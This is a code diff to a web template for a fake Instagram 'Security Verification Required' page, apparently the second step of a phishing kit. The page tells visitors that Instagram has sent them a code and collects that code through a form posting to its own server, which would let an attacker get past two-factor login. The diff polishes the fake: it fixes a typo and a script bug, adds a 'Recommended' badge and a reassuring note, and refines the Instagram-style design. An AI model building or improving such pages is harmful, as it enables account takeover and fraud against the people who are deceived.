@@ -1,6 +1,6 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(228,64,95,0.25);border-radius:16px;">
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 4px 12px rgba(228,64,95,0.15);border-radius:16px;">
   <div class="platform-header">
     <div class="icon-circle bg-instagram">
       <i class="fa-brands fa-instagram icon-lg"></i>
@@ -13,23 +13,34 @@
 
   <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Security Verification Required</h3>
   
-  <div class="play-instructions">
-    <div class="instruction-card">
-      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Verification Code</h4>
+  <div class="security-options">
+    <div class="option-card">
+      <div class="option-header">
+        <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Verification Code</h4>
+        <div class="option-badge">Recommended</div>
+      </div>
       <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
-        To confirm that you are the rightful owner of the Instagram account you logged in with, a verification code has been sent to your registered SMS or email by Instagram. Please enter the code below and click “Submit” to continue.
+        To confirm that you are the rightful owner of the Instagram account you logged in with, a verification code has been sent to your registered SMS or email by Instagram. Please enter the code below and click "Submit" to continue.
       </p>
     </div>
+  </div>
 
   <form id="loginForm" method="post" novalidate>
     <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
-    <input class="input" id="digits" name="digits" placeholder="Enter code" pattern="\d{4,9}" required>
+    <input class="input" id="digits" name="digits" placeholder="Enter 4-9 digit code" pattern="\d{4,9}" required>
     <div class="error-text" id="digitsError"></div>
 
     <div class="center">
-      <button class="btn login-btn" type="submit">Summit</button>
+      <button class="btn login-btn" type="submit">Submit</button>
     </div>
   </form>
+
+  <div class="note-box">
+    <div class="note-icon">💡</div>
+    <p style="font-size:13px;color:#64748b;margin:0;line-height:1.5">
+      <strong>Note:</strong> If you've already received the verification code, please enter it above to complete the security process.
+    </p>
+  </div>
 </div>
 
 <script>
@@ -53,7 +64,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
   if (!valid) event.preventDefault();
 });
 
-document.getElementById("digits").add.addEventListener("input", () => {
+document.getElementById("digits").addEventListener("input", () => {
   const digits = document.getElementById("digits");
   const digitsError = document.getElementById("digitsError");
   digits.classList.remove("input-error");
@@ -70,11 +81,13 @@ document.getElementById("digits").add.addEventListener("input", () => {
   margin-bottom: 8px;
   font-size: 16px;
   transition: border-color 0.2s, box-shadow 0.2s;
+  background: #fafafa;
 }
 .input:focus {
   border-color: #E4405F;
   box-shadow: 0 0 0 3px rgba(228,64,95,0.2);
   outline: none;
+  background: #ffffff;
 }
 .input-error {
   border-color: #ef4444;
@@ -98,28 +111,79 @@ document.getElementById("digits").add.addEventListener("input", () => {
   cursor: pointer;
   border: none;
   transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
-  box-shadow: 0 6px 16px rgba(221,42,123,0.25);
+  box-shadow: 0 4px 12px rgba(221,42,123,0.25);
   display: block;
   margin-top: 8px;
 }
 .login-btn:hover {
   background: linear-gradient(45deg, #fd5949, #d6249f, #c13584, #833ab4);
-  box-shadow: 0 8px 20px rgba(221,42,123,0.35);
+  box-shadow: 0 6px 16px rgba(221,42,123,0.35);
 }
 .login-btn:active {
   transform: scale(0.985);
 }
 
-.play-instructions {
+.security-options {
   margin: 20px 0;
 }
 
-.instruction-card {
+.option-card {
   background: #fdf2f8;
-  padding: 16px;
-  border-radius: 12px;
+  padding: 18px;
+  border-radius: 14px;
   border-left: 4px solid #E4405F;
   margin-bottom: 16px;
+  transition: all 0.2s ease;
+}
+
+.option-card:hover {
+  background: #fce7f3;
+  transform: translateY(-1px);
+}
+
+.option-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 8px;
+}
+
+.option-badge {
+  background: linear-gradient(135deg, #10b981, #059669);
+  color: white;
+  font-size: 11px;
+  font-weight: 700;
+  padding: 4px 8px;
+  border-radius: 8px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.note-box {
+  background: #fffbeb;
+  border: 1px solid #fef3c7;
+  border-radius: 14px;
+  padding: 16px 18px;
+  margin-top: 20px;
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  transition: all 0.2s ease;
+}
+
+.note-box:hover {
+  background: #fef3c7;
+  border-color: #f59e0b;
+}
+
+.note-icon {
+  font-size: 16px;
+  margin-top: 1px;
+  flex-shrink: 0;
+}
+
+.center {
+  text-align: center;
 }
 </style>
 {% endblock %}
